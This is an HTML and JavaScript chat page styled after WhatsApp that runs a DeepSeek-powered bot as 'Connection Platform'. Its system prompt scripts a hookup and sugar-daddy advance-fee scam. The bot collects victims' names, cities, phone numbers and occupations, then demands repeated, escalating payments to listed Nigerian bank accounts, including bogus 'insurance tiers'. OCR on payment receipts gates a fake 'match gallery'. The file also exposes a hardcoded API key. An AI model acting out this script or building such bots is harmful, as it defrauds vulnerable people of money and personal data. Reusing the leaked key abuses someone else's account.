<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <title>Connection Platform</title>

    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#202c33" id="theme-color-meta">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="Customer Service">
    <link rel="apple-touch-icon" href="icon.png">

    <!-- Client-side OCR for reading receipt screenshots directly in browser -->
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>

    <style>
        /* WhatsApp Dark Theme Palette (Default) */
        :root {
            --bg-body: #0b141a;
            --bg-container: #0b141a;
            --border-container: #222d34;
            --bg-header: #202c33;
            --text-header: #e9edef;
            --text-status: #8696a0;
            --bg-chat: #0b141a;
            --pattern-opacity: 0.02;
            --bg-user-msg: #005c4b;
            --text-user-msg: #e9edef;
            --bg-bot-msg: #202c33;
            --text-bot-msg: #e9edef;
            --text-loading: #8696a0;
            --bg-input-area: #202c33;
            --bg-input-wrapper: #2a3942;
            --text-input: #e9edef;
            --placeholder-input: #8696a0;
            --icon-color: #8696a0;
            --icon-hover: #e9edef;
            --btn-install: #00a884;
            --btn-install-text: #111b21;
            --ios-banner-bg: #1f2c34;
            --ios-banner-text: #f59e0b;
            --doc-bg: rgba(0, 0, 0, 0.2);
            --file-preview-bg: #1f2c34;
            --vn-bar-bg: rgba(255, 255, 255, 0.3);
            --vn-bar-active: #ffffff;
            --vn-subtext: rgba(255, 255, 255, 0.7);
            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        /* WhatsApp Light Theme Palette (Auto Sync with System Theme) */
        @media (prefers-color-scheme: light) {
            :root {
                --bg-body: #d1d7db;
                --bg-container: #efeae2;
                --border-container: #d1d7db;
                --bg-header: #008069;
                --text-header: #ffffff;
                --text-status: #d1e8e2;
                --bg-chat: #efeae2;
                --pattern-opacity: 0.06;
                --bg-user-msg: #d9fdd3;
                --text-user-msg: #111b21;
                --bg-bot-msg: #ffffff;
                --text-bot-msg: #111b21;
                --text-loading: #667781;
                --bg-input-area: #f0f2f5;
                --bg-input-wrapper: #ffffff;
                --text-input: #111b21;
                --placeholder-input: #667781;
                --icon-color: #54656f;
                --icon-hover: #111b21;
                --doc-bg: rgba(0, 0, 0, 0.05);
                --file-preview-bg: #e9edef;
                --vn-bar-bg: rgba(0, 0, 0, 0.2);
                --vn-bar-active: #54656f;
                --vn-subtext: #667781;
            }
        }

        /* iOS Platform UI Adjustments */
        body.platform-ios {
            --font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", sans-serif;
        }
        body.platform-ios .message {
            border-radius: 14px;
        }

        /* Android Platform UI Adjustments */
        body.platform-android {
            --font-family: Roboto, "Segoe UI", sans-serif;
        }
        body.platform-android .message {
            border-radius: 6px;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); }
        
        html, body { 
            height: 100%; 
            height: 100dvh; 
            background: var(--bg-body); 
            color: var(--text-bot-msg); 
            overflow: hidden; 
        }

        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        } 
        
        .chat-container { 
            width: 100%; 
            max-width: 480px; 
            height: 100%; 
            height: 100dvh; 
            background: var(--bg-container); 
            display: flex; 
            flex-direction: column; 
        }

        @media (min-width: 500px) { 
            .chat-container { 
                height: 92vh; 
                border-radius: 12px; 
                border: 1px solid var(--border-container); 
                box-shadow: 0 4px 20px rgba(0,0,0,0.15); 
            } 
        }

        /* Header */
        .chat-header { background: var(--bg-header); color: var(--text-header); padding: 10px 16px; display: flex; align-items: center; gap: 12px; height: 60px; flex-shrink: 0; border-bottom: 1px solid var(--border-container); }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); overflow: hidden; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .header-info { flex: 1; display: flex; flex-direction: column; cursor: pointer; }
        .header-name { font-size: 16px; font-weight: 500; color: var(--text-header); }
        .header-status { font-size: 12px; color: var(--text-status); }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        #install-btn { background: var(--btn-install); border: none; color: var(--btn-install-text); padding: 6px 10px; border-radius: 14px; cursor: pointer; font-size: 11px; font-weight: bold; white-space: nowrap; }

        .ios-banner { background: var(--ios-banner-bg); color: var(--ios-banner-text); padding: 10px 16px; font-size: 12px; text-align: center; border-bottom: 1px solid var(--border-container); display: none; line-height: 1.4; flex-shrink: 0; }

        /* Chat Messages Box */
        .chat-box { flex: 1; min-height: 0; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; background-color: var(--bg-chat); background-image: radial-gradient(circle, rgba(0,0,0,var(--pattern-opacity)) 1px, transparent 1px); background-size: 24px 24px; }
        
        .message { 
            max-width: 85%; padding: 8px 10px; font-size: 14.5px; line-height: 1.4; word-break: break-word; position: relative; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
            -webkit-user-select: text; user-select: text; 
        }
        .message.user { background: var(--bg-user-msg); color: var(--text-user-msg); align-self: flex-end; border-top-right-radius: 0; }
        .message.bot { background: var(--bg-bot-msg); color: var(--text-bot-msg); align-self: flex-start; border-top-left-radius: 0; }
        .message.loading { color: var(--text-loading); font-style: italic; background: var(--bg-bot-msg); }

        /* Persistent Button Area */
        .persistent-btn-area {
            display: none;
            padding: 12px 16px;
            background: var(--bg-input-area);
            border-top: 1.5px solid #D4AF37;
            text-align: center;
        }
        .match-gallery-btn {
            background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%);
            color: #000000;
            padding: 14px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 800;
            display: block;
            width: 100%;
            font-size: 15px;
            text-transform: uppercase;
            box-shadow: 0 2px 10px rgba(212, 175, 55, 0.4);
        }

        .message a { color: #53bdeb !important; text-decoration: underline !important; pointer-events: auto !important; cursor: pointer !important; word-break: break-all; }

        #file-preview { display: none; background: var(--file-preview-bg); color: var(--text-bot-msg); padding: 6px 16px; font-size: 13px; border-top: 1px solid var(--border-container); align-items: center; justify-content: space-between; flex-shrink: 0; }
        #file-preview span { cursor: pointer; color: #f87171; font-weight: bold; }

        /* Input Bar */
        .input-area { background: var(--bg-input-area); padding: 8px 12px; display: flex; align-items: center; gap: 8px; min-height: 62px; flex-shrink: 0; box-sizing: border-box; }
        .input-box-wrapper { flex: 1; background: var(--bg-input-wrapper); border-radius: 8px; display: flex; align-items: center; padding: 0 12px; gap: 8px; }
        input[type="text"] { flex: 1; background: transparent; border: none; outline: none; color: var(--text-input); font-size: 16px; padding: 10px 0; }
        input[type="text"]::placeholder { color: var(--placeholder-input); }
        .whatsapp-icon-btn { background: none; border: none; color: var(--icon-color); cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; padding: 4px; }
        
        .mic-send-btn { 
            background: #00a884; color: #ffffff; border: none; width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; flex-shrink: 0; transition: background 0.2s; 
            -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; touch-action: manipulation;
        }
        .mic-send-btn.recording { background: #ef4444; color: white; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        /* Disabled Chat Input Lock */
        .input-area.disabled {
            opacity: 0.4;
            pointer-events: none;
        }
    </style>
</head>
<body>

<div class="chat-container">
    <div class="chat-header">
        <div class="avatar">
            <img src="icon.png" alt="Profile" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'%238696a0\'><path d=\'M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z\'/></svg>'">
        </div>
        <div class="header-info">
            <div class="header-name">Connection Platform</div>
            <div class="header-status">online</div>
        </div>
        <div class="header-actions">
            <button id="install-btn" onclick="installApp()">📥 Install App</button>
        </div>
    </div>
    
    <div id="ios-instruction" class="ios-banner">
        To install on iPhone: Tap browser <b>Share</b> below, then <b>"Add to Home Screen"</b>.
    </div>

    <div id="chatBox" class="chat-box"></div>
    
    <div id="persistentButtonArea" class="persistent-btn-area">
        <a id="persistentLinkBtn" href="#" class="match-gallery-btn">Click Here to Open Match Gallery</a>
    </div>

    <div id="file-preview">
        <span id="file-name">file.png</span>
        <span onclick="clearFile()">✕ Remove</span>
    </div>

    <input type="file" id="fileInput" accept="image/*,application/pdf,.doc,.docx" style="display: none;" onchange="handleFileSelect(this)" />

    <div class="input-area" id="inputAreaBox">
        <button class="whatsapp-icon-btn" onclick="document.getElementById('fileInput').click()" title="Attach File">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
        </button>

        <div class="input-box-wrapper">
            <input type="text" id="messageInput" placeholder="Type a message" oninput="toggleInputButton()" />
            <button class="whatsapp-icon-btn" onclick="document.getElementById('fileInput').click()" title="Camera">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
            </button>
        </div>

        <button class="mic-send-btn" id="mainActionBtn" title="Hold to Record / Tap to Send">
            <svg id="micIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v1a7 7 0 0 1-14 0v-1"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
        </button>
    </div>
</div>

<script>
    const API_KEY = "sk-ec11c49f9d3845f19e94b2902a5c0665";
    const DEEPSEEK_API_URL = "https://api.deepseek.com/chat/completions";

    const SYSTEM_INSTRUCTIONS = `You are an agent for Connection Platform, a premium Nigerian private networking society.
    Follow the exact trigger sequence and payment verification protocols:

    Question 1 TRIGGER: User starts a conversation.
    - Base message: hello what’s your name and which city are you living in? (Rephrase uniquely).

    Question 2 TRIGGER: User provided answer to Q1.
    - Base message: "which connection are you interested in?
    1. Sugar mommy or Sugar daddy (₦2000)
    2. Hookup girls group (₦1500)
    3. Sex video call (₦1000)
    4. Friends with benefits (₦1000)
    5. Sex video and sex tape group (₦1000)
    6. Serious relationship in Nigeria (₦1000)
    7. Serious relationship outside Nigeria (₦5000)
    8. Get paid for chatting with rich people abroad (₦8000)"

    Question 3 TRIGGER: User specifies connection choice.
    - Base message: "alright before you can be able to connect with anyone, You have to register and become a member of our platform Now To activate your Membership, Now To activate your Member ID you have to make the payment of [Total Fee] This fee helps cover operational costs, Facebook ads and improve match quality, use this opay bank account: (8074938917) or (610 863 9595) The name is akono mercy uka"

    Question 8 TRIGGER: User returned from HTML form and agrees to connection fee.
    - Base message: "alright, use this opay bank account: (8074938917) or (610 863 9595) The name is akono mercy uka"
    - Proof of Payment Protocol: Wait for receipt image or text. If user says 'done' or 'okay', say 'I'm waiting'. If they say no money, reply 'Okay.' and stop.

    Question 9 TRIGGER: User sends proof of payment.
    - Base message: "Final Key Verified. What is your active WhatsApp number for Group Integration?"

    Question 10 TRIGGER: User sends number.
    - Base message: "What is your current occupation for profile compatibility?"

    Question 11 TRIGGER: User sends occupation.
    - Base message: "Choose your Insurance & Speed Tier:
    1. Basic (₦2,500): 24hr release.
    2. Fast-Track (₦5,500): 5hr release + 2yr Insurance.
    3. Instant (₦10,500): 1hr release + Lifetime Insurance."

    Question 12 TRIGGER: User selects tier.
    - Base message: "FINAL STEP: alright, use this moniepoint bank account: (8154481349) or (8984139933) both are Moniepoint and under the name akono mercy uka."

    Question 13 TRIGGER: User sends verified tier payment proof.
    - Base message: "your membership ID is (@683[ABBREVIATED_NAME]-3/[CITY]/[STATE]/7742). Send all your proof of payment and membership id on WhatsApp to: +2347084316064."`;

    // Detect Platform (iOS vs Android)
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    if (isIOS) {
        document.body.classList.add('platform-ios');
    } else {
        document.body.classList.add('platform-android');
    }

    // Sync Theme Color
    function updateThemeColor() {
        const metaThemeColor = document.getElementById('theme-color-meta');
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
            metaThemeColor.setAttribute('content', '#008069');
        } else {
            metaThemeColor.setAttribute('content', '#202c33');
        }
    }
    updateThemeColor();
    window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', updateThemeColor);

    let chatHistory = JSON.parse(localStorage.getItem('deepseek_chat_history')) || [
        { role: "system", content: SYSTEM_INSTRUCTIONS },
        { role: "assistant", content: "hello what’s your name and which city are you living in?" }
    ];

    let pendingCategoryPage = localStorage.getItem('pending_category_page') || '';
    let pendingCategoryName = localStorage.getItem('pending_category_name') || '';

    window.addEventListener('DOMContentLoaded', () => {
        loadChatHistory();
        checkPersistentButtonState();
        checkReturnHandshake();
    });

    function loadChatHistory() {
        renderChatMessages();
    }

    function saveChatHistory() {
        localStorage.setItem('deepseek_chat_history', JSON.stringify(chatHistory));
    }

    function renderChatMessages() {
        const chatBox = document.getElementById('chatBox');
        chatBox.innerHTML = '';
        chatHistory.forEach(msg => {
            if (msg.role === 'system') return;
            const div = document.createElement('div');
            div.className = `message ${msg.role === 'assistant' ? 'bot' : 'user'}`;
            div.innerHTML = formatText(msg.content);
            chatBox.appendChild(div);
        });
        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function checkPersistentButtonState() {
        const isPaid = localStorage.getItem('membership_fee_paid') === 'true';
        const savedUrl = localStorage.getItem('unlocked_gallery_url');
        const savedName = localStorage.getItem('unlocked_gallery_name');
        
        const area = document.getElementById('persistentButtonArea');
        const btn = document.getElementById('persistentLinkBtn');
        const inputAreaBox = document.getElementById('inputAreaBox');

        if (isPaid && savedUrl) {
            btn.href = savedUrl;
            btn.innerText = `Click Here to Open ${savedName || 'Match'} Gallery`;
            area.style.display = 'block';
            inputAreaBox.classList.add('disabled'); // Stop user from chatting further until button is clicked
        } else {
            area.style.display = 'none';
            inputAreaBox.classList.remove('disabled'); // Chat active
        }
    }

    function checkReturnHandshake() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('returned') === 'true') {
            const amount = urlParams.get('amount') || '3000';
            
            // User finished gallery form, remove button lock and reactivate chat
            localStorage.removeItem('membership_fee_paid');
            localStorage.removeItem('unlocked_gallery_url');
            localStorage.removeItem('unlocked_gallery_name');
            checkPersistentButtonState();

            const promptMsg = `User completed match selection form and agreed to payment of ₦${amount}. Send Question 8 trigger now with bank details.`;
            chatHistory.push({ role: "user", content: promptMsg });
            saveChatHistory();
            window.history.replaceState({}, document.title, window.location.pathname);
            triggerDeepSeekResponse();
        }
    }

    /* File & Media Handlers */
    function handleFileSelect(input) {
        if (input.files && input.files[0]) {
            document.getElementById('file-name').textContent = input.files[0].name;
            document.getElementById('file-preview').style.display = 'flex';
            toggleInputButton();
        }
    }

    function clearFile() {
        document.getElementById('fileInput').value = '';
        document.getElementById('file-preview').style.display = 'none';
        toggleInputButton();
    }

    function toggleInputButton() {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        const btn = document.getElementById('mainActionBtn');
        
        if (text || file) {
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>`;
        } else if (!isRecording) {
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v1a7 7 0 0 1-14 0v-1"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>`;
        }
    }

    /* Voice Note Recording */
    let mediaRecorder, audioChunks = [], recordedAudioBlob = null, isRecording = false;
    const actionBtn = document.getElementById('mainActionBtn');

    actionBtn.addEventListener('pointerdown', (e) => {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        if (!text && !file) { e.preventDefault(); startRecording(); }
    });

    actionBtn.addEventListener('pointerup', (e) => { if (isRecording) { e.preventDefault(); stopRecording(); } });

    async function startRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                stream.getTracks().forEach(track => track.stop());
                if (audioChunks.length > 0) {
                    recordedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendMessage();
                }
            };
            mediaRecorder.start();
            isRecording = true;
            actionBtn.classList.add('recording');
            actionBtn.innerHTML = `⏹`;
        } catch (err) { alert('Microphone access denied.'); }
    }

    function stopRecording() {
        if (mediaRecorder && isRecording) {
            mediaRecorder.stop();
            isRecording = false;
            actionBtn.classList.remove('recording');
            toggleInputButton();
        }
    }

    actionBtn.addEventListener('click', () => {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        if (text || file) sendMessage();
    });

    document.getElementById('messageInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });

    /* Send Message & DeepSeek API Dispatch */
    async function sendMessage() {
        const textInput = document.getElementById('messageInput');
        const fileInput = document.getElementById('fileInput');
        const text = textInput.value.trim();
        const file = fileInput.files[0];

        if (!text && !file && !recordedAudioBlob) return;

        let userContent = text || "Sent an attachment/voice note.";
        let isReceiptSubmitted = false;

        // OCR receipt processing if image uploaded
        if (file && file.type.startsWith('image/')) {
            appendLoadingMessage('Reading payment receipt...');
            try {
                const ocrResult = await Tesseract.recognize(file, 'eng');
                const extractedText = ocrResult.data.text;
                userContent += ` [Proof of Payment Receipt OCR Extracted Text: ${extractedText}]`;
                isReceiptSubmitted = true;
            } catch(e) {
                userContent += ` [User uploaded receipt image]`;
                isReceiptSubmitted = true;
            }
            removeLoadingMessage();
        } else if (recordedAudioBlob) {
            userContent = "[User sent a voice note recording]";
        } else if (text.toLowerCase().includes('paid') || text.toLowerCase().includes('sent') || text.toLowerCase().includes('done') || text.toLowerCase().includes('receipt')) {
            isReceiptSubmitted = true;
        }

        chatHistory.push({ role: "user", content: userContent });
        textInput.value = '';
        clearFile();
        recordedAudioBlob = null;
        toggleInputButton();
        saveChatHistory();
        renderChatMessages();

        triggerDeepSeekResponse(isReceiptSubmitted);
    }

    async function triggerDeepSeekResponse(isReceiptSubmitted = false) {
        const loadingId = appendLoadingMessage();

        try {
            const response = await fetch(DEEPSEEK_API_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${API_KEY}`
                },
                body: JSON.stringify({
                    model: "deepseek-chat",
                    messages: chatHistory,
                    stream: false
                })
            });

            const data = await response.json();
            removeLoadingMessage();

            const reply = data.choices && data.choices[0] ? data.choices[0].message.content : "Understood.";
            chatHistory.push({ role: "assistant", content: reply });
            saveChatHistory();
            renderChatMessages();

            // Track category preference at Question 2
            trackCategoryChoice(reply, chatHistory[chatHistory.length - 2].content);

            // Unlock button ONLY IF receipt was submitted & verified for membership fee
            if (isReceiptSubmitted && pendingCategoryPage) {
                unlockGalleryButton();
            }

        } catch (err) {
            removeLoadingMessage();
            chatHistory.push({ role: "assistant", content: "Network connection error. Please try again." });
            saveChatHistory();
            renderChatMessages();
        }
    }

    /* Track Chosen Category at Question 2 */
    function trackCategoryChoice(botReply, userMsg) {
        const combined = (botReply + " " + userMsg).toLowerCase();

        if (combined.includes('sugar') || combined.includes('mommy') || combined.includes('daddy') || combined.includes('2000')) {
            pendingCategoryPage = 'sugar_mommy.html'; pendingCategoryName = 'Sugar Mommy / Daddy';
        } else if (combined.includes('chat') || combined.includes('rich') || combined.includes('8000')) {
            pendingCategoryPage = 'paid_chat.html'; pendingCategoryName = 'Get Paid For Chatting';
        } else if (combined.includes('outside nigeria') || combined.includes('5000')) {
            pendingCategoryPage = 'serious_int.html'; pendingCategoryName = 'Serious Relationship Outside Nigeria';
        } else if (combined.includes('relationship in nigeria') || combined.includes('serious') || combined.includes('1000')) {
            pendingCategoryPage = 'serious_ng.html'; pendingCategoryName = 'Serious Relationship in Nigeria';
        } else if (combined.includes('hookup') || combined.includes('benefit') || combined.includes('video call') || combined.includes('1500')) {
            pendingCategoryPage = 'media_exchange.html'; pendingCategoryName = 'Casual Connections';
        }

        if (pendingCategoryPage) {
            localStorage.setItem('pending_category_page', pendingCategoryPage);
            localStorage.setItem('pending_category_name', pendingCategoryName);
        }
    }

    /* Unlock Button & Lock Chat Input */
    function unlockGalleryButton() {
        if (!pendingCategoryPage) return;
        localStorage.setItem('membership_fee_paid', 'true');
        localStorage.setItem('unlocked_gallery_url', pendingCategoryPage);
        localStorage.setItem('unlocked_gallery_name', pendingCategoryName);
        checkPersistentButtonState();
    }

    function formatText(text) {
        if (!text) return '';
        let html = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const urlRegex = /(https?:\/\/[^\s]+|www\.[^\s]+)/g;
        html = html.replace(urlRegex, url => `<a href="${url}" target="_blank">${url}</a>`);
        return html.replace(/\n/g, '<br>');
    }

    function appendLoadingMessage(txt = 'Typing...') {
        const chatBox = document.getElementById('chatBox');
        const div = document.createElement('div');
        div.className = `message bot loading`;
        div.id = 'loading-msg';
        div.textContent = txt;
        chatBox.appendChild(div);
        chatBox.scrollTop = chatBox.scrollHeight;
        return 'loading-msg';
    }

    function removeLoadingMessage() {
        const el = document.getElementById('loading-msg');
        if (el) el.remove();
    }

    /* PWA Install Handler */
    let deferredPrompt;
    const installBtn = document.getElementById('install-btn');
    window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
    async function installApp() {
        if (deferredPrompt) {
            deferredPrompt.prompt();
            const { outcome } = await deferredPrompt.userChoice;
            if (outcome === 'accepted') installBtn.style.display = 'none';
            deferredPrompt = null;
        } else {
            alert('To install on Android, tap browser menu (3 dots) and select "Install app".');
        }
    }
</script>
